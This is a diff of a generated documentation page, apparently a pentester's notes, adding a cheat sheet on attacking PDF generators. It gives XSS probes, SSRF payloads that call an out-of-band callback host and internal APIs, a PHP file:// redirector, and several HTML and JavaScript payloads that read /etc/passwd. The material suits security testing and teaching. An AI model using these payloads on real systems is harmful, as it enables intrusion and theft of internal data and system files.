@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
     
     
       
@@ -1981,6 +1981,62 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="PDF Generation Vulnerabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#local-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Local File Inclusion
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Local File Inclusion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#annotations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Annotations
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
     </ul>
@@ -2513,6 +2569,62 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="PDF Generation Vulnerabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#local-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Local File Inclusion
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Local File Inclusion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#annotations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Annotations
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
     </ul>
@@ -2897,6 +3009,77 @@
 <h2 id="pdf-generation-vulnerabilities">PDF Generation Vulnerabilities</h2>
 <ul>
 <li><code>exiftool invoice.pdf</code> - use exiftool to gain information about the library used to generate the PDF after downloading from the target</li>
+<li>If we can post to an site and the generate a PDF we can check if the server executes what we post during generation.
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>test1<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span> <span class="cm">&lt;!-- entered into the title field --&gt;</span>
+</span><span id="__span-5-2"><span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>test2<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span> <span class="cm">&lt;!-- entered into the comment field--&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>If one of the tests comes back bold, we know that field is possibly vulnerable</li>
+</ul>
+<h3 id="xss">XSS</h3>
+<ul>
+<li>Next we can test if JS is executed
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;test1&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Show where generated PDFs are stored with
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h3 id="ssrf">SSRF</h3>
+<ul>
+<li>Test for SSRF by sending requests to a server we control with one of the following
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1&quot;</span><span class="p">/&gt;</span>
+</span><span id="__span-8-2"><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2&quot;</span> <span class="p">&gt;</span>
+</span><span id="__span-8-3"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>If the generated PDF displays the HTTP response from our server we have a regular SSRF vulnerability and we can extract data by making calls to internal API's
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://127.0.0.1:8080/api/users&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;800&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;500&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>If the PDF does not display the response we can test if it does after redirct</li>
+<li>Run the following PHP script on the server
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><span class="cp">&lt;?php</span> <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: file://&#39;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Then send the following request (this really comes under LFI)
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://172.17.0.1:8000/redirector.php?url=%2fetc%2fpasswd&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;800&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;500&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h3 id="local-file-inclusion">Local File Inclusion</h3>
+<ul>
+<li>Test for LFI with base64 encoding to avoid errors
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-12-2"><span class="w">    </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span><span id="__span-12-3"><span class="w">    </span><span class="nx">x</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(){</span>
+</span><span id="__span-12-4"><span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">))</span>
+</span><span id="__span-12-5"><span class="w">    </span><span class="p">};</span>
+</span><span id="__span-12-6"><span class="w">    </span><span class="nx">x</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;file:///etc/passwd&quot;</span><span class="p">);</span>
+</span><span id="__span-12-7"><span class="w">    </span><span class="nx">x</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span><span id="__span-12-8"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>We can still test for LFI if the JS is not executed purely with HTML tags
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;file:///etc/passwd&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;800&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;500&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span><span id="__span-13-2"><span class="p">&lt;</span><span class="nt">object</span> <span class="na">data</span><span class="o">=</span><span class="s">&quot;file:///etc/passwd&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;800&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;500&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-13-3"><span class="p">&lt;</span><span class="nt">portal</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;file:///etc/passwd&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;800&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;500&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h4 id="annotations">Annotations</h4>
+<ul>
+<li>Some PDF generation libraries (mPDF pre version 6.0, PD4ML) support annotations or attachments</li>
+<li>The following will append the LFI to the PDF
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><span class="p">&lt;</span><span class="nt">annotation</span> <span class="na">file</span><span class="o">=</span><span class="s">&quot;/etc/passwd&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;/etc/passwd&quot;</span> <span class="na">icon</span><span class="o">=</span><span class="s">&quot;Graph&quot;</span> <span class="na">title</span><span class="o">=</span><span class="s">&quot;LFI&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-14-2"><span class="p">&lt;</span><span class="nt">pd4ml:attachment</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/etc/passwd&quot;</span> <span class="na">description</span><span class="o">=</span><span class="s">&quot;LFI&quot;</span> <span class="na">icon</span><span class="o">=</span><span class="s">&quot;Paperclip&quot;</span><span class="p">/&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
 </ul>
 
 
